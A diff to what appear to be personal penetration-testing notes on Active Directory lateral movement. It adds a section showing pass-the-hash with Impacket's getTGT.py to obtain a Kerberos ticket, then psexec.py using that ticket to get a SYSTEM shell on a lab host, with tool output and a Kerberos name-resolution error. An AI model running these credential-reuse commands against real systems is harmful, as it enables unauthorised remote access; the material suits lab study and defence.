@@ -262,6 +262,7 @@ $ nbtscan 192.168.100.0/24
 - RPC open (port 135) use  [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) 
 -  445 port (SMB) open  use impacket psexec
 
+**NT HASH AUTHENTICATION**
 ```powershell
 $ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -284,5 +285,42 @@ nt authority\system
 
 - now NT hash is used as PtH , is Kerberos authentication is used PtT attack happens
 
+**KERBEROS TICKET AUTHENTICATION**
+```POWERSHELL
+$ getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
-- 
+[*] Saving ticket in Anakin.ccache
+$ export KRB5CCNAME=$(pwd)/Anakin.ccache
+
+$ psexec.py contoso.local/Anakin@WS01-10 -target-ip 192.168.100.10 -k -no-pass
+
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.100.10.....
+[*] Found writable share ADMIN$
+[*] Uploading file TwIEeeqd.exe
+[*] Opening SVCManager on 192.168.100.10.....
+[*] Creating service ZQZb on 192.168.100.10.....
+[*] Starting service ZQZb.....
+[!] Press help for extra shell commands
+The system cannot find message text for message number 0x2350 in the message file for Application.
+
+(c) Microsoft Corporation. All rights reserved.
+b'Not enough memory resources are available to process this command.\r\n'
+C:\Windows\system32>
+```
+==Note== when using kerberos ticket use Netbios name or dns name not ip 
+
+```powershell
+$ psexec.py contoso.local/Anakin@192.168.100.10 -k -no-pass
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+```
+
+##### Connecting with Powershell Remoting
+
+
+
+
